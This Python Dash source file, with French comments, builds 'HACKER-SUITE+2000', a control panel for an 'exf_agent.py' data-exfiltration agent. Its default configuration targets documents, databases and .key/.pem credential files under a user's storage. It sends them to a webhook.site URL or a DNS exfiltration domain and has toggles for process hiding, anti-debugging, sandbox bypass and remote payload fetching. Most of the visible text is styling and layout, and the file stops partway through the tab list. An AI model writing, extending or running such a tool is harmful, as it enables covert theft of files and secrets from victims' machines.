import dash
from dash import dcc, html, dash_table
from dash.dependencies import Input, Output, State, ALL, MATCH
import subprocess
import shlex
import os
import time
import json
import sys
import base64
import signal
import re
import shutil
from datetime import datetime
import mimetypes # Importation manquante pour mimetypes.guess_type

# --- Nettoyage du cache Python (important pour les mises à jour de modules) ---
def clean_pycache():
    """Supprime les répertoires __pycache__ pour forcer la relecture des modules."""
    for root, dirs, files in os.walk(os.path.dirname(os.path.abspath(__file__))):
        if '__pycache__' in dirs:
            shutil.rmtree(os.path.join(root, '__pycache__'))

clean_pycache()

# --- IMPORTS DE TES MODULES (s'assurer que le chemin est correct) ---
AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
# Assurez-vous que AGENT_DIR est ajouté une seule fois au sys.path,
# et surtout avant tout import de 'modules.*' pour éviter les 'Fallback INFO'.
if AGENT_DIR not in sys.path:
    sys.path.insert(0, AGENT_DIR)

# --- Définition d'un Logger/Mock pour compatibilité (priorité élevée) ---
_GLOBAL_MODULE_LOGGER = None
try:
    from modules.logger import Logger as AgentLogger
    # Correction ici: stdout_enabled=True pour que les logs soient capturés par LogStreamer
    _GLOBAL_MODULE_LOGGER = AgentLogger(log_file_path=None, cipher_key=None, debug_mode=True, stdout_enabled=True)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.logger.Logger importé et configuré.")
except ImportError as e:
    class UIMockLoggerFallback:
        def __init__(self): pass
        def log_debug(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_DEBUG] {msg}")
        def log_info(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_INFO] {msg}")
        def log_warning(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_WARNING] {msg}")
        def log_error(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_ERROR] {msg}")
        def log_critical(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_CRITICAL] {msg}")
        def get_new_logs(self, last_index: int = 0) -> tuple[list[str], int]: return [], 0
        def reset_logs(self): pass

    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] AVERTISSEMENT: modules.logger.Logger non trouvé. Utilisation de UIMockLoggerFallback.")
except Exception as e:
    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur lors de l'initialisation de modules.logger.Logger: {e}. Utilisation de UIMockLoggerFallback.")


# --- Initialisation du LogStreamer global (sera activé via callback) ---
# Il est crucial que global_log_streamer soit une instance unique,
# même lors des rechargements de Flask en mode debug.
global_log_streamer = None
try:
    from modules.log_streamer import LogStreamer
    # Utiliser une variable de module pour stocker l'instance du streamer
    # afin de la rendre persistante à travers les rechargements (si possible)
    # ou au moins de la rendre unique pour l'instance actuelle de l'application.
    if not hasattr(sys, '_global_log_streamer_instance'):
        sys._global_log_streamer_instance = LogStreamer(max_buffer_lines=1000)
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] LogStreamer module trouvé. Instance créée. Sera activé au démarrage du serveur.")
    global_log_streamer = sys._global_log_streamer_instance
except ImportError as e:
    class MockLogStreamer:
        def __init__(self, max_buffer_lines: int = 1000):
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: LogStreamer module non trouvé. Les logs en direct de l'UI seront limités.")
        def start_capturing(self): pass
        def stop_capturing(self): pass
        def write(self, message: str): pass
        def flush(self): pass
        def get_logs(self, last_index: int = 0) -> tuple[list[str], int]: return [], 0
        def clear_logs(self): pass
    global_log_streamer = MockLogStreamer()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.log_streamer: {e}. Les logs en direct ne seront pas disponibles.")

# Permet à Dash de maintenir l'état entre les rechargements du serveur en mode debug.
# Sinon, ces variables seraient réinitialisées, causant une perte de logs visibles.
if not hasattr(sys, '_explorer_log_states'):
    sys._explorer_log_states = {
        'file_explorer': {'last_index': 0, 'logs': []},
        'web_explorer': {'last_index': 0, 'logs': []}
    }
explorer_log_states = sys._explorer_log_states

# --- Définition des classes Mock/Fallback pour les explorateurs ---
class BaseMockExplorer:
    TARGET_TYPE_FILE = "file"
    TARGET_TYPE_DIRECTORY = "directory"
    TARGET_TYPE_CONTENT = "content_match" # Ajouté pour WebExplorer
    TARGET_TYPE_API = "api_endpoint"      # Ajouté pour WebExplorer
    TARGET_TYPE_VULN = "vulnerable_path"  # Ajouté pour WebExplorer
    TARGET_TYPE_SITEMAP_ENTRY = "sitemap_entry" # Ajouté pour WebExplorer
    TARGET_TYPE_FORM = "form_data" # Ajouté pour WebExplorer

    def __init__(self, debug_mode: bool = False):
        self._LOGGER = _GLOBAL_MODULE_LOGGER
        # Mettre à jour le message pour éviter le "Fallback INFO" si le module réel est censé être là
        if self.__class__.__name__ == "BaseMockExplorer": # Seulement si c'est le mock directement instancié
             self._LOGGER.log_warning(f"[{self.__class__.__name__}] Module non importé, utilisant un mock.")


    def explore_path(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_path non implémentée (mock).")
        return []

    # explore_url doit être la méthode appelée par control_panel
    def explore_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_url non implémentée (mock).")
        # Simule une erreur HTTP pour tester le message d'erreur si la fonction est appelée
        time.sleep(1)
        self._LOGGER.log_error(f"[{self.__class__.__name__}] Simulation d'erreur: Impossible de se connecter (mock).")
        return []

    # Nouvelle méthode pour la récursion dans WebExplorer
    def explore_url_recursive_entry(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_url_recursive_entry non implémentée (mock).")
        time.sleep(1)
        self._LOGGER.log_error(f"[{self.__class__.__name__}] Simulation d'erreur: Exploration récursive impossible (mock).")
        return []

    def read_file_content(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité read_file_content non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def read_file_content_from_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité read_file_content_from_url non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def download_file_base64(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité download_file_base64 non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def download_file_base64_from_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité download_file_base64_from_url non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def get_found_targets(self):
        return []
    
    def get_exploration_stats(self):
        # Pour le mock, renvoie des stats de base
        return {
            'urls_visited': 0, 'urls_queued': 0, 'urls_skipped_external': 0, 'urls_skipped_visited': 0, 'urls_skipped_robots': 0,
            'files_identified': 0, 'dirs_identified': 0, 'content_matches': 0,
            'api_endpoints_identified': 0, 'vuln_paths_identified': 0, 'sitemap_entries_identified': 0,
            'forms_identified': 0, 'requests_successful': 0, 'requests_failed': 0, 'total_requests_made': 0,
            'bytes_downloaded_html': 0, 'bytes_downloaded_files': 0,
            'last_status': 'Mock Idle', 'current_url': 'N/A',
            'start_time': None, 'end_time': None, 'duration_seconds': 0
        }

    def reset_state(self):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] État réinitialisé (mock).")
        pass


# --- Tente d'importer les modules réels, utilise les mocks si l'import échoue ---
# L'ordre est important ! On importe les modules réels APRES avoir configuré sys.path
# et AVANT d'instancier les explorateurs globaux.
OriginalFileExplorer = BaseMockExplorer
OriginalWebExplorer = BaseMockExplorer
AES256Cipher = None

try:
    from modules.file_explorer import FileExplorer # Importe la classe FileExplorer
    # Assigne directement le _GLOBAL_MODULE_LOGGER à la variable globale _LOGGER du module file_explorer
    # C'EST LA LIGNE CLÉ POUR CORRIGER LE FALLBACK LOGGER
    import modules.file_explorer
    modules.file_explorer._LOGGER = _GLOBAL_MODULE_LOGGER
    OriginalFileExplorer = FileExplorer
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.file_explorer.FileExplorer importé et logger injecté avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.file_explorer: {e}. Les fonctionnalités de File Explorer seront limitées.")

try:
    from modules.web_explorer import WebExplorer # Importe la classe WebExplorer
    # Assigne directement le _GLOBAL_MODULE_LOGGER à la variable globale _LOGGER du module web_explorer
    # C'EST LA LIGNE CLÉ POUR CORRIGER LE FALLBACK LOGGER
    import modules.web_explorer
    modules.web_explorer._LOGGER = _GLOBAL_MODULE_LOGGER
    OriginalWebExplorer = WebExplorer
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.web_explorer.WebExplorer importé et logger injecté avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.web_explorer: {e}. Les fonctionnalités de Web Explorer seront limitées.")

try:
    from modules.aes256 import AES256Cipher as ImportedAES256Cipher
    AES256Cipher = ImportedAES256Cipher
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.aes256.AES256Cipher importé avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.aes256: {e}. Le chiffrement des logs ne sera pas disponible.")

try:
    from modules.system_profiler import SystemProfiler as ImportedSystemProfiler
    # Assurez-vous que SystemProfiler est instancié avec le GLOBAL_MODULE_LOGGER
    if hasattr(sys, '_global_system_profiler_instance'): # Pour éviter la réinitialisation en mode debug
        global_system_profiler = sys._global_system_profiler_instance
    else:
        global_system_profiler = ImportedSystemProfiler(logger=_GLOBAL_MODULE_LOGGER)
        sys._global_system_profiler_instance = global_system_profiler
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.system_profiler.SystemProfiler importé et instancié avec succès.")
except ImportError as e:
    class MockSystemProfiler:
        def __init__(self, logger=None):
            self._log = logger.log_warning if logger else lambda msg: print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_WARNING] [MockSystemProfiler] {msg}")
            self._log("Module SystemProfiler non importé, utilisant un mock.")
        def collect_system_info(self):
            self._log("info", "Fonctionnalité de profilage système non disponible (mock).")
            return {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "ERROR: SystemProfiler module not found or failed to import.",
                "details": str(e)
            }
    global_system_profiler = MockSystemProfiler(logger=_GLOBAL_MODULE_LOGGER)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.system_profiler: {e}. Les fonctionnalités de System Profiler seront limitées. Utilisation de MockSystemProfiler.")


# Crée les instances globales des explorateurs, en s'assurant qu'elles sont uniques et utilisent le logger global.
if not hasattr(sys, '_global_file_explorer_instance'):
    sys._global_file_explorer_instance = OriginalFileExplorer(debug_mode=True)
global_file_explorer = sys._global_file_explorer_instance

if not hasattr(sys, '_global_web_explorer_instance'):
    sys._global_web_explorer_instance = OriginalWebExplorer(debug_mode=True)
global_web_explorer = sys._global_web_explorer_instance


# --- Configuration des Chemins ---
AGENT_PATH = os.path.join(AGENT_DIR, 'exf_agent.py')
LOG_FILE_PATH = os.path.join(AGENT_DIR, 'agent_logs.enc')
SHARED_CONFIG_FILE = os.path.join(AGENT_DIR, 'shared_config.json')

# --- Globals pour l'état du processus de l'agent ---
running_agent_process = None
agent_output_buffer = []

# --- Fonctions utilitaires ---
def generate_aes_key(length: int = 32) -> str:
    """Génère une clé AES aléatoire de la longueur spécifiée (en bytes) et l'encode en Base64."""
    return base64.urlsafe_b64encode(os.urandom(length)).decode('utf-8').rstrip('=')

def load_shared_config():
    """Charge la configuration depuis le fichier JSON partagé."""
    config_data = {}
    if os.path.exists(SHARED_CONFIG_FILE):
        try:
            with open(SHARED_CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
            _GLOBAL_MODULE_LOGGER.log_info(f"Fichier de configuration partagé '{SHARED_CONFIG_FILE}' chargé.")
        except json.JSONDecodeError:
            _GLOBAL_MODULE_LOGGER.log_error(f"Le fichier '{SHARED_CONFIG_FILE}' est corrompu. Recréation forcée lors de la première sauvegarde.")
        except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_error(f"Erreur lors du chargement de la config partagée '{SHARED_CONFIG_FILE}': {e}")
    return config_data

def save_shared_config(config_data: dict):
    """Sauvegarde la configuration dans le fichier JSON partagé."""
    try:
        with open(SHARED_CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        _GLOBAL_MODULE_LOGGER.log_info(f"Configuration sauvegardée dans '{SHARED_CONFIG_FILE}'.")
    except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_error(f"Impossible de sauvegarder la configuration dans '{SHARED_CONFIG_FILE}': {e}")

# --- Charger/Générer la configuration au démarrage de l'application Dash ---
shared_config_data = load_shared_config()

if not shared_config_data or 'aes_key' not in shared_config_data:
    _GLOBAL_MODULE_LOGGER.log_info("Génération d'une nouvelle configuration partagée (clé AES et valeurs par défaut).")
    shared_config_data = {
        "aes_key": generate_aes_key(),
        "default_target_url": "https://webhook.site/VOTRE_URL_UNIQUE_ICI",
        "default_scan_path": os.path.expanduser('~') + "/storage/shared",
        "default_file_types": ".doc,.docx,.txt,.pdf,.xls,.xlsx,.csv,.db,.sqlite,.json,.xml,.key,.pem,.pptx,.log,.md",
        "default_exclude_types": ".exe,.dll,.sys,.bin,.tmp,.py,.sh,.bak,.old",
        "default_min_size": "1k",
        "default_max_size": "100M",
        "default_dns_server": "8.8.8.8",
        "default_dns_domain": "exfil.yourdomain.com",
        "default_keywords": "",
        "default_regex_patterns": "",
        "default_payload_url": "",
        "default_payload_path": "",
        "default_threads": 4, # Valeur par défaut numérique, ne pas en faire une liste par erreur
        "default_debug_mode": ["debug"], # Type corrigé : liste pour initialisation
        "default_no_clean": ["no-clean"],   # Type corrigé : liste pour initialisation
        "default_no_anti_evasion": [], # Type corrigé : liste vide
        "default_explorer_target_host": "http://127.0.0.1",
        "default_explorer_base_path": "/var/www/html" if os.path.exists("/var/www/html") else "",
        "default_explorer_depth": 3,
        "default_exfil_method": "https",
        "default_stealth_hide_process": [],
        "default_stealth_anti_debug": [],
        "default_stealth_sandbox_bypass": [],
    }
    save_shared_config(shared_config_data)
    _GLOBAL_MODULE_LOGGER.log_warning(f"Veuillez remplacer l'URL 'https://webhook.site/VOTRE_URL_UNIQUE_ICI' dans le fichier '{SHARED_CONFIG_FILE}' par votre URL webhook.site via l'interface ou manuellement !")

# --- Valeurs par défaut de l'UI (utilisées dans le layout) ---
# Correction: Joindre les listes en chaînes de caractères pour les inputs cachés
DEFAULT_AES_KEY = shared_config_data.get('aes_key', '')
DEFAULT_TARGET_URL = shared_config_data.get('default_target_url', '')
DEFAULT_SCAN_PATH = shared_config_data.get('default_scan_path', os.path.expanduser('~'))
DEFAULT_FILE_TYPES = shared_config_data.get('default_file_types', '')
DEFAULT_EXCLUDE_TYPES = shared_config_data.get('default_exclude_types', '')
DEFAULT_MIN_SIZE = shared_config_data.get('default_min_size', '1k')
DEFAULT_MAX_SIZE = shared_config_data.get('default_max_size', '100M')
DEFAULT_DNS_SERVER = shared_config_data.get('default_dns_server', '8.8.8.8')
DEFAULT_DNS_DOMAIN = shared_config_data.get('default_dns_domain', '')
DEFAULT_KEYWORDS = shared_config_data.get('default_keywords', '')
DEFAULT_REGEX_PATTERNS = shared_config_data.get('default_regex_patterns', '')
DEFAULT_PAYLOAD_URL = shared_config_data.get('default_payload_url', '')
DEFAULT_PAYLOAD_PATH = shared_config_data.get('default_payload_path', '')
DEFAULT_THREADS = shared_config_data.get('default_threads', 4)
# Modifier ces valeurs par défaut pour qu'elles soient des chaînes, pas des listes directes
# Si la liste est vide, la chaîne résultante de ','.join([]) est une chaîne vide '', ce qui est correct pour dcc.Input
DEFAULT_DEBUG_MODE = ','.join(shared_config_data.get('default_debug_mode', []))
DEFAULT_NO_CLEAN = ','.join(shared_config_data.get('default_no_clean', []))
DEFAULT_NO_ANTI_EVASION = ','.join(shared_config_data.get('default_no_anti_evasion', []))
DEFAULT_EXPLORER_TARGET_HOST = shared_config_data.get('default_explorer_target_host', "http://127.0.0.1")
DEFAULT_EXPLORER_BASE_PATH = shared_config_data.get('default_explorer_base_path', "")
DEFAULT_EXPLORER_DEPTH = shared_config_data.get('default_explorer_depth', 3)
DEFAULT_EXFIL_METHOD = shared_config_data.get('default_exfil_method', 'https')
# Modifier ces valeurs par défaut pour qu'elles soient des chaînes, pas des listes directes
DEFAULT_STEALTH_HIDE_PROCESS = ','.join(shared_config_data.get('default_stealth_hide_process', []))
DEFAULT_STEALTH_ANTI_DEBUG = ','.join(shared_config_data.get('default_stealth_anti_debug', []))
DEFAULT_STEALTH_SANDBOX_BYPASS = ','.join(shared_config_data.get('default_stealth_sandbox_bypass', []))


# --- Initialisation de l'application Dash ---
app = dash.Dash(__name__, title="HACKER-SUITE+2000",
                external_stylesheets=[
                    'https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap'
                ],
                prevent_initial_callbacks='initial_duplicate',
                assets_folder=os.path.join(AGENT_DIR, 'display')
               )

app.config.suppress_callback_exceptions = True


# --- Styles CSS pour un thème "Cyber Ops Pro :: Metallic Noir" ---
CYBER_OPS_STYLE = {
    'backgroundColor': '#0A0A0A',
    'color': '#00EEFF',
    'fontFamily': '"Roboto Mono", "Consolas", "Courier New", monospace',
    'padding': '0',
    'margin': '0',
    'overflowY': 'auto',
    'overflowX': 'hidden',
    'fontSize': '14px',
    'backgroundImage': 'linear-gradient(to bottom right, #0A0A0A, #1A1A1A)',
    'backgroundAttachment': 'fixed',
}

CYBER_HEADER_STYLE = {
    'textAlign': 'center',
    'color': '#7FFF00',
    'padding': '25px 0',
    'marginBottom': '0px',
    'textShadow': '0 0 20px rgba(127,255,0,0.9), 0 0 30px rgba(127,255,0,0.6)',
    'fontSize': '3em',
    'fontWeight': 'bold',
    'letterSpacing': '5px',
    'borderBottom': '2px solid #005500',
    'backgroundColor': '#1C1C1C',
    'boxShadow': '0 4px 10px rgba(0,0,0,0.5)',
    'textTransform': 'uppercase'
}

CYBER_TABS_CONTAINER_STYLE = {
    'backgroundColor': '#101010',
    'borderBottom': '2px solid #004400',
    'paddingLeft': '20px',
    'paddingRight': '20px',
    'paddingTop': '10px',
    'maxWidth': '1100px',
    'margin': '0 auto',
    'borderRadius': '0 0 8px 8px',
    'boxShadow': '0 5px 15px rgba(0,0,0,0.3)'
}

CYBER_TAB_STYLE = {
    'backgroundColor': '#1E1E1E',
    'color': '#00AACC',
    'border': '1px solid #333333',
    'borderBottom': 'none',
    'borderRadius': '6px 66px 0 0',
    'padding': '15px 30px',
    'marginRight': '8px',
    'fontSize': '1.3em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    'transition': 'all 0.2s ease-in-out',
    'cursor': 'pointer',
    'boxShadow': 'inset 0 2px 5px rgba(0,0,0,0.2)'
}

CYBER_TAB_SELECTED_STYLE = {
    'backgroundColor': '#004400',
    'color': '#7FFF00',
    'border': '1px solid #7FFF00',
    'borderBottom': 'none',
    'borderRadius': '6px 66px 0 0',
    'padding': '15px 30px',
    'marginRight': '8px',
    'fontSize': '1.3em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    'cursor': 'default',
    'boxShadow': 'inset 0 3px 8px rgba(0,0,0,0.3), 0 0 15px rgba(127,255,0,0.5)'
}

CYBER_SECTION_CONTENT_STYLE = {
    'padding': '40px',
    'maxWidth': '1100px',
    'margin': '30px auto',
    'backgroundColor': '#101010',
    'borderRadius': '10px',
    'boxShadow': '0 0 30px rgba(0,255,65,0.1), inset 0 0 10px rgba(0,255,65,0.05)',
    'border': '1px solid #006600',
    'flexGrow': '1',
    'position': 'relative',
    'overflow': 'hidden',
}

CYBER_SECTION_HEADER_STYLE = {
    'color': '#FF00FF',
    'borderBottom': '1px dashed #550055',
    'paddingBottom': '18px',
    'marginBottom': '30px',
    'textShadow': '0 0 10px rgba(255,0,255,0.7)',
    'fontSize': '2em',
    'fontWeight': 'bold',
    'letterSpacing': '2px',
    'textTransform': 'uppercase',
}

CYBER_INPUT_WRAPPER_STYLE = {
    'display': 'flex',
    'alignItems': 'center',
    'marginBottom': '20px',
    'gap': '12px'
}

CYBER_INPUT_STYLE = {
    'flexGrow': '1',
    'padding': '15px',
    'backgroundColor': '#050505',
    'border': '1px solid #005500',
    'borderRadius': '4px',
    'color': '#7FFF00',
    'boxSizing': 'border-box',
    'boxShadow': 'inset 0 0 8px rgba(0,255,65,0.08)',
    'fontSize': '1.1rem',
    'outline': 'none',
    'transition': 'border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out',
    'appearance': 'none',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_BASE = {
    'padding': '16px 32px',
    'border': 'none',
    'borderRadius': '4px',
    'cursor': 'pointer',
    'fontSize': '1.2rem',
    'fontWeight': 'bold',
    'transition': 'all 0.2s ease-in-out',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    'flex': '1 1 150px',
    'minWidth': '150px',
    'maxWidth': 'calc(50% - 7.5px)',
    'background': 'linear-gradient(145deg, #2A2A2A, #1A1A1A)',
    'boxShadow': '5px 5px 10px rgba(0,0,0,0.3), -5px -5px 10px rgba(30,30,30,0.2)',
    'border': '1px solid #333333',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_PRIMARY = {
    **CYBER_BUTTON_BASE,
    'color': '#0A0A0A',
    'backgroundImage': 'linear-gradient(145deg, #7FFF00, #4CAF50)',
    'boxShadow': '0 0 25px rgba(127,255,0,0.8), 5px 5px 10px rgba(0,0,0,0.4), -5px -5px 10px rgba(120,255,0,0.1)',
    'marginTop': '30px',
    'marginRight': '15px',
    'border': '1px solid #66CC00'
}

CYBER_BUTTON_SECONDARY = {
    **CYBER_BUTTON_BASE,
    'color': '#0A0A0A',
    'backgroundImage': 'linear-gradient(145deg, #00BFFF, #0077AA)',
    'boxShadow': '0 0 20px rgba(0,191,255,0.6), 5px 5px 10px rgba(0,0,0,0.3), -5px -5px 10px rgba(0,191,255,0.1)',
    'marginTop': '30px',
    'marginRight': '15px',
    'border': '1px solid #0099CC'
}

CYBER_BUTTON_DANGER = {
    **CYBER_BUTTON_BASE,
    'color': '#FFFFFF',
    'backgroundImage': 'linear-gradient(145deg, #FF3333, #AA0000)',
    'boxShadow': '0 0 25px rgba(255,0,0,0.8), 5px 5px 10px rgba(0,0,0,0.4), -5px -5px 10px rgba(255,0,0,0.1)',
    'marginTop': '30px',
    'marginLeft': '15px',
    'border': '1px solid #CC0000'
}

CYBER_BUTTON_APPLY = {
    'backgroundColor': '#E5C07B',
    'color': '#0A0A0A',
    'padding': '12px 20px',
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '0.9rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 10px rgba(229,192,123,0.6)',
    'transition': 'all 0.1s ease-in-out',
    'flexShrink': '0',
    'background': 'linear-gradient(145deg, #E5C07B, #C29F64)',
    'border': '1px solid #AA8855',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_APPLY_ACTIVE = {
    **CYBER_BUTTON_APPLY,
    'backgroundColor': '#00A000',
    'boxShadow': '0 0 12px rgba(0,160,0,0.8)',
    'color': '#FFFFFF',
    'background': 'linear-gradient(145deg, #00CC00, #008800)',
    'border': '1px solid #006600'
}


CYBER_STATUS_BOX_STYLE = {
    'backgroundColor': '#080808',
    'padding': '25px',
    'borderRadius': '6px',
    'overflowX': 'auto',
    'whiteSpace': 'pre-wrap',
    'wordWrap': 'break-word',
    'color': '#7FFF00',
    'border': '1px solid #004400',
    'minHeight': '180px',
    'maxHeight': '450px',
    'overflowY': 'auto',
    'boxShadow': 'inset 0 0 10px rgba(0,255,65,0.05)',
    'fontSize': '0.95rem',
    'lineHeight': '1.5',
    'fontFamily': '"Roboto Mono", monospace',
}
CYBER_STATUS_ERROR = {**CYBER_STATUS_BOX_STYLE, 'color': '#FF5555', 'border': '1px solid #CC3333'}
CYBER_STATUS_WARNING = {**CYBER_STATUS_BOX_STYLE, 'color': '#FFEE77', 'border': '1px solid #CCAA55'}
CYBER_STATUS_INFO = {**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'border': '1px solid #00AAAA'}

CYBER_TABLE_HEADER_STYLE = {
    'backgroundColor': '#151515',
    'color': '#00FFFF',
    'fontWeight': 'bold',
    'border': '1px solid #005500',
    'textAlign': 'center',
    'padding': '15px',
    'textTransform': 'uppercase',
    'letterSpacing': '1px',
    'fontSize': '1rem',
    'background': 'linear-gradient(145deg, #1A1A1A, #0A0A0A)',
    'boxShadow': 'inset 0 2px 5px rgba(0,0,0,0.3)',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_TABLE_CELL_STYLE = {
    'backgroundColor': '#080808',
    'color': '#00EEFF',
    'border': '1px solid #002200',
    'padding': '12px',
    'whiteSpace': 'normal',
    'height': 'auto',
    'textAlign': 'left',
    'fontSize': '0.9rem',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_ACTION_BUTTON_TABLE_STYLE = {
    'backgroundColor': '#00AACC',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px',
    'padding': '8px 12px',
    'margin': '4px',
    'cursor': 'pointer',
    'fontSize': '0.8rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 8px rgba(0,170,204,0.5)',
    'textTransform': 'uppercase',
    'transition': 'all 0.15s ease-in-out',
    'background': 'linear-gradient(145deg, #00CCEE, #0099BB)',
    'fontFamily': '"Roboto Mono", monospace',
}
CYBER_DOWNLOAD_BUTTON_TABLE_STYLE = {
    'backgroundColor': '#AA00AA',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px',
    'padding': '8px 12px',
    'margin': '4px',
    'cursor': 'pointer',
    'fontSize': '0.8rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 8px rgba(170,0,170,0.5)',
    'textTransform': 'uppercase',
    'transition': 'all 0.15s ease-in-out',
    'background': 'linear-gradient(145deg, #EE00EE, #BB00BB)',
    'fontFamily': '"Roboto Mono", monospace',
}


# --- STYLE POUR LE TABLEAU DE BORD STATISTIQUE ---
CYBER_STAT_CARD_STYLE = {
    'backgroundColor': '#151515',
    'border': '1px solid #005500',
    'borderRadius': '8px',
    'padding': '20px',
    'textAlign': 'center',
    'boxShadow': '0 0 15px rgba(0,255,65,0.1)',
    'flex': '1 1 200px',
    'margin': '10px',
    'minWidth': '220px',
    'height': '150px',
    'display': 'flex',
    'flexDirection': 'column',
    'justifyContent': 'center',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_STAT_VALUE_STYLE = {
    'fontSize': '2.5em',
    'fontWeight': 'bold',
    'color': '#7FFF00',
    'textShadow': '0 0 10px rgba(127,255,0,0.7)',
    'marginBottom': '5px'
}

CYBER_STAT_LABEL_STYLE = {
    'fontSize': '0.9em',
    'color': '#00FFFF',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

# --- Fonction pour lire le contenu de index.html ---
def get_display_html_content():
    try:
        # Chemin relatif au fichier control_panel.py
        html_path = os.path.join(AGENT_DIR, 'display', 'index.html')
        with open(html_path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        _GLOBAL_MODULE_LOGGER.log_error(f"Erreur lors de la lecture de index.html: {e}")
        return "<h1>Erreur de chargement de l'affichage dynamique</h1><p>Impossible de charger le contenu de l'interface d'affichage.</p>"


# --- Layout de l'application Dash ---
app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
    # L'en-tête H1 va ici
    html.H1([
        "HACKER-SUITE",
        html.Br(),
        "+2000"
    ], style={
        **CYBER_HEADER_STYLE,
        'color': '#FF0000',
        'textShadow': '0 0 20px rgba(255,0,0,0.9), 0 0 30px rgba(255,0,0,0.6)',
        'fontSize': '3.5em',
        'letterSpacing': '8px'
    }),

    # Les onglets DCC vont ici
    dcc.Tabs(
        id="cyber-tabs",
        value='tab-dynamic-display',
        parent_className='custom-tabs-container',
        className='custom-tabs',
        children=[
            dcc.Tab(label=':: DYNAMIC DISPLAY ::', value='tab-dynamic-display', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: DASHBOARD ::', value='tab-dashboard', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: AGENT CONTROL ::', value='tab-agent-control', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: FILE EXPLORER ::', value='tab-file-explorer', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: SYSTEM PROFILER ::', value='tab-system-profiler', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
